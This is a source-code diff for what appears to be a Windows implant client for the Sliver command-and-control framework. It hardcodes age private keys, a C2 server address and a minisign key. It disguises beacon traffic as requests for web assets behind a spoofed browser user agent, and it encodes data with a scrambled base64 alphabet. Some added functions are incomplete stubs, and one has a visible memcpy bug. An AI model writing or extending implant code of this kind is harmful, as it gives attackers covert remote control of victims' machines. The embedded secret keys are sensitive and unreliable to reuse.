@@ -763,6 +763,10 @@ VOID FreeSliverHttpClient
 		}
 	}
 
+	if (pClient->lpServerMinisignPublicKey != NULL) {
+		FREE(pClient->lpServerMinisignPublicKey);
+	}
+
 	FreeWebProxy(pClient->HttpConfig.pProxyConfig);
 	FREE(pClient);
 }
@@ -932,7 +936,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	PSLIVER_HTTP_CLIENT pResult = NULL;
 	BOOL IsOk = FALSE;
 	LPSTR lpEncodedSessionKey = NULL;
-	CHAR szRecipientPubKey[] = "age1m425fl9w4cew5rgx9ea3x3k22w6aurzn96xqd0dutz0xa2d834ss2jqfkn";
+	/*CHAR szRecipientPubKey[] = "age1m425fl9w4cew5rgx9ea3x3k22w6aurzn96xqd0dutz0xa2d834ss2jqfkn";
 	CHAR szPeerPubKey[] = "age1kqklxpvg45rw053jtwtcn2wn4wqetwy0mw6c0rln8m5a3tarlqcq94j8jq";
 	CHAR szPrivPrivKey[] = "AGE-SECRET-KEY-1F7J93DWQMN49F3A333ZA3766LND9T3LMT3GK3QHYFCGCRPWEKQHQ6NF3LK";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
@@ -941,10 +945,10 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	LPSTR SessionFiles[] = { "rpc", "index", "admin", "register" };
 	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
 	LPSTR CloseFiles[] = { "banner", "button", "avatar", "photo" };
-	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
+	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";*/
 
 	// Laptop config ---------------------------------------------------------------------
-	/*CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
+	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
 	CHAR szPeerPubKey[] = "age1e983tu02e4ht5m5s3kdc8gcddpqs8jvkdft4644e80ngnh3rrvvqw06pk2";
 	CHAR szPrivPrivKey[] = "AGE-SECRET-KEY-1H8ACTYAEN9TN8XM4FNJR0KLAFR0FDMAQ8NTJTLKU3JZA6TWR7QSQ206NN8";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
@@ -953,7 +957,8 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	LPSTR SessionFiles[] = { "rpc", "index", "admin", "register" };
 	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
 	LPSTR CloseFiles[] = { "banner", "button", "avatar", "photo" };
-	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";*/
+	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: C974C3DEE0AE9DF4\nRWT0na7g3sN0yad3zBthDFTfPuEnuG+wDeLQesyaBb3nTCIVsBg+PXAv";
 
 	CHAR szHostName[] = "https://192.168.43.236";
 	DWORD i = 0;
@@ -1007,6 +1012,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	pResult->uEncoderNonce = 4258;
 	pResult->UseStandardPort = TRUE;
 	pResult->lpHostName = DuplicateStrA(szHostName, 0);
+	pResult->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
 
 	IsOk = TRUE;
 CLEANUP:
@@ -1174,12 +1180,15 @@ PURI StartSessionURL
 )
 {
 	LPSTR lpUrlPath = NULL;
+	LPSTR lpTemp = NULL;
 	PURI pResult = NULL;
 	LPSTR lpFullUri = NULL;
 	LPSTR lpNonce = NULL;
 
 	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
-	TrimSuffixA(lpUrlPath, "php");
+	lpTemp = TrimSuffixA(lpUrlPath, "php", FALSE);
+	FREE(lpUrlPath);
+	lpUrlPath = lpTemp;
 	lpUrlPath = REALLOC(lpUrlPath, lstrlenA(lpUrlPath) + 5);
 	lstrcatA(lpUrlPath, "html");
 	lpFullUri = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
@@ -1218,12 +1227,10 @@ PBYTE SliverBase64Decode
 	DWORD i = 0;
 	lpTemp = ALLOC(cbInput + 1);
 	DWORD dwPos = 0;
-	CHAR szTemp[] = { '\0', '\0' };
 	PBYTE pResult = NULL;
 
 	for (i = 0; i < cbInput; i++) {
-		szTemp[0] = lpInput[i];
-		dwPos = StrStrA(szNewCharSet, szTemp) - szNewCharSet;
+		dwPos = StrChrA(szNewCharSet, lpInput[i]) - szNewCharSet;
 		lpTemp[i] = szOldCharSet[dwPos];
 	}
 
@@ -1243,18 +1250,84 @@ LPSTR SliverBase64Encode
 	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
 	DWORD i = 0;
-	CHAR szTemp[] = { '\0', '\0' };
 	DWORD dwPos = 0;
 
 	lpResult = Base64Encode(lpInput, cbInput, TRUE);
 	cbResult = lstrlenA(lpResult);
 	for (i = 0; i < cbResult; i++) {
-		szTemp[0] = lpResult[i];
-		dwPos = StrStrA(szOldCharSet, szTemp) - szOldCharSet;
+		dwPos = StrChrA(szOldCharSet, lpResult[i]) - szOldCharSet;
 		lpResult[i] = szNewCharSet[dwPos];
 	}
 
 	return lpResult;
+}
+
+PMINISIGN_PUB_KEY DecodeMinisignPublicKey
+(
+	_In_ LPSTR lpInput
+)
+{
+	PMINISIGN_PUB_KEY pResult = NULL;
+	LPSTR* pSplittedArray = NULL;
+	DWORD cbSplittedArray = 0;
+	PBYTE pTemp = NULL;
+	DWORD cbTemp = NULL;
+	DWORD i = 0;
+
+	pSplittedArray = StrSplitNA(lpInput, "\n", 0, &cbSplittedArray);
+	if (pSplittedArray == NULL || cbSplittedArray == 0) {
+		goto CLEANUP;
+	}
+
+	pTemp = Base64Decode(pSplittedArray[1], &cbTemp);
+	if (cbTemp != sizeof(MINISIGN_PUB_KEY)) {
+		FREE(pTemp);
+		goto CLEANUP;
+	}
+
+	pResult = (PMINISIGN_PUB_KEY)pTemp;
+CLEANUP:
+	if (pSplittedArray != NULL) {
+		for (i = 0; i < cbSplittedArray; i++) {
+			if (pSplittedArray[i] != NULL) {
+				FREE(pSplittedArray[i]);
+			}
+		}
+
+		FREE(pSplittedArray);
+	}
+	
+	return pResult;
+}
+
+BOOL VerifySign
+(
+	_In_ PMINISIGN_PUB_KEY pPubKey,
+	_In_ PBYTE pMessage,
+	_In_ DWORD cbMessage
+)
+{
+	UINT16 Algorithm;
+	BYTE KeyID[8];
+	BYTE Signature[ED25519_SIGNATURE_SIZE];
+	BOOL Result = FALSE;
+
+	memcpy(Algorithm, pMessage, sizeof(Algorithm));
+	memcpy(KeyID, pMessage + sizeof(Algorithm), sizeof(KeyID));
+	memcpy(Signature, pMessage + sizeof(Algorithm) + sizeof(KeyID), sizeof(Signature));
+	if (memcmp(KeyID, pPubKey->KeyId, sizeof(KeyID))) {
+		LogError(L"memcmp failed at %lls.\n", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	if (pPubKey->SignatureAlgorithm != HASH_EDDSA) {
+		LogError(L"SignatureAlgorithm != HASH_EDDSA at %lls.\n", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+
+CLEANUP:
+	return Result;
 }
 
 PBYTE SessionDecrypt
@@ -1265,7 +1338,15 @@ PBYTE SessionDecrypt
 	_Out_ PDWORD pcbPlainText
 )
 {
-	//Chacha20Poly1305Decrypt(pClient->pSessionKey, )
+	PBYTE pResult = NULL;
+
+	if (cbCipherText < MINISIGN_SIZE + 1) {
+		goto CLEANUP;
+	}
+
+
+CLEANUP:
+	return pResult;
 }
 
 PSLIVER_HTTP_CLIENT SliverSessionInit()
@@ -1295,7 +1376,7 @@ PSLIVER_HTTP_CLIENT SliverSessionInit()
 		goto CLEANUP;
 	}
 
-	pDecodedResp = Base64Decode(pResp->pRespData, &cbDecodedResp);
+	pDecodedResp = SliverBase64Decode(pResp->pRespData, &cbDecodedResp);
 	if (pDecodedResp == NULL || cbDecodedResp == 0) {
 		goto CLEANUP;
 	}
